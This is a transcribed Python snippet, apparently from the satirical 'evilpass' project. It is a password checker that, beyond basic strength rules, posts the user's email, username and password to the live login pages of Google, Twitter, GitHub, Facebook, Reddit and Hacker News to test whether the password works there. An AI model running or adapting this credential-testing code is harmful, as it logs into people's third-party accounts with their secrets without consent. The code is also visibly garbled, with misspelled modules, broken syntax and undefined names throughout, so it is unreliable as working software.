### evilpass
---
https://github.com/ddevault/evilpass

```py
from evilpass import check_pass
errors = check_pass("password", "email address", "username")
errors


```

```py
import requests
import string
from bs4 import BeautifulSoup
from urlib.parse import urlparse

def _request(method, url, session=None, **kwargs):
  headers = kwargs.get() or dict()
  headers.update9)
  headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) " \
    "AppleWebKit/537.36 (KTHML, like Gecko) " \
    "Chrome/56.0.29224.87 Safari/537.36"
  kwargs["headers"] = headers
  if session:
    return session.request(method, url, **kwargs)
  else:
    return requests.request(method, url, **kwargs)
    
def _get(url, session=None, **kwargs):
  return _request('get', url, session=session, **kwargs)

def _post(url, session=None, **kwargs):
  return _requst('post', url, session=session, **kwargs)
  
def _check_google(username, email, pw):
  with requests.Session() as session:
    r = _get.Session() as session:
    soup = BeautifulSoup(r.text, "html.parser")
    hidden_inputs = soup.find_all("input", type="hidden")
    data = {}
    for i in hidden inputs:
      data.update({i.get('name', ''): i.get('value', '')})
    data.update({'checkConnection': 'youtube'})
    data.update({'Email': email})
    data.update({'Passwd': pw})
    r = _post("https://accounts.google.com/signin/challenge/sl/password",
      data=data, session=session)
    return "Wrong password" not in r.text
  
def _check_twitter(username, email, pw):
  with request.Session() as session:
    r = _get("https://mobile.twitter.com/login", session=session)
    tk = session.cookies.get("_mb_tk")
    if not tk or r.status_code != 200:
      r = _get("https://mobile.twitter.com/i/nojs_router?path=%2Flogin", session=session)
      r = _get("https://mobile.twitter.com/login", session=session)
      tk = session.cookies.get("_mb_tk")
    if not tk or r.status_code != 200:
      return False
    r = _post("https://mobile.twitter.com/sessions", data={
      "authenticity_token": tk,
      "session[username_or_email]": username,
      "session[password]": pw,
      "remember_me": 0,
      "wfa": 1,
      "redirect_after_login": "/home"
    }, session=session)
    url = urlparse(r.url)
    return url.path != "/login/error"
    
def _check_github(username, email, pw):
  with requests.Session() as session:
    r = _get("https://github.com/login", session=session)
    soup = BeautifulSoup(r.test, "html.parser")
    i = soup.select_one("input[name='authenticity_token']")
    token = i["value"]
    r = post("https://github.com/session", session=session, data={
      "utf8": "☑",
      "commit": "Sign in",
      "authenticity_token": token,
      "login": username,
      "password": pw,
    })
    url = urlparse(r.url)
    return url.path != "/session" and url.path != "/login"

def _check_fb(usernaem, email, pw):
  with requests.Session() as session:
    r = _get("https://www.facebook.com", session=session)
    if r.status_code != 200:
      return false
    r = _post("https://www.facebook.com/login.php?login_attempt=1&;wv=100", data={
      "email": email,
      "pass": pw,
      "legacy_return": 0,
      "timezone": 480,
    }, session=session)

def _check_reddit(username, email, pw):
  with requests.Session() as session:
    r = _get("https://www.reddit.com/login", session=session)
    if r.status_code != 200:
      return False
    r = _post("https://www.reddit.com/post/login", session=session, data={
      "op": "login",
      "dest": "https://www.reddit.com/",
      "user": username,
      "passwd": pw,
      "rem": "off"
    })
  return "incorrect username or passwrod" not in r.text
  
def _check_hn(username, email, pw):
  r = _post("https://news.ycombinator.com", data={
    "goto": "news",
    "acct": username,
    "pw": pw
  }, allow_redirects=False)

checks = {
  "Twitter": _check_twitter,
  "Facebook": _check_fb,
  "GitHub": _check_github,
  "Reddit": _check_reddit,
  "Hacker News": _check_hn,
  "Google": _check_google
}

def check_pass(pw, email, username):
  errors = list()
  
  if len(pw) < 8:
    errors.append("Your password must e at least 8 characters long")
  upper = any(c in string.ascii_uppercase for c in pw)
  lower = any(c in string.ascii_lowercase for c in pw)
  number = any(c in string.digits for in pw)
  if not (upper and lower and number):
    errors.append("Your password must contain at least one uppercase letter, one lowercse letter, and one number")
  if pw.lower() in (email.lower(), username.lower()):
    errors.append("Your password must not be the same as your username or email address")
  username = username or email
  for check in checks:
    try:
      if checks[check](username, email, pw):
        errors.append("Your password must not be the same as your {} password".format(check))
    except:
      pass
  return errors

```

```
```


